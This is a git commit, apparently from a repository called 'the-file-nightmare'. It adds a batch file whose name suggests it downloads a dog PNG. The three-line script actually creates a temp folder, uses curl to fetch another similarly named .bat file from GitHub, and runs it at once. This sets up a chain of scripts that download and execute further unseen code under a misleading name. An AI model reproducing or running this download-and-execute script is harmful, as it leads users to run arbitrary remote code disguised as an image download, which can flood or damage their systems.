b97a3e120eb167cf61401f8f35204e966d502b93
ENERGIE123 <110022950+ENERGIE123@users.noreply.github.com>
2024-07-21 12:49:35 +0200

    Create downloaddownloaddownloaddownloaddownloaddogepng.bat

---
+++ images/dogs/1/downloaddownloaddownloaddownloaddownloaddogepng.bat
@@ -0,0 +1,3 @@
+mkdir "%temp%/GetDogePng"
+curl https://raw.githubusercontent.com/ENERGIE123/the-file-nightmare/main/images/dogs/1/1/downloaddownloaddownloaddownloaddogepng.bat > "%temp%\GetDogePng\downloaddownloaddownloaddownloaddogepng.bat"
+%temp%/GetDogePng/downloaddownloaddownloaddownloaddogepng.bat
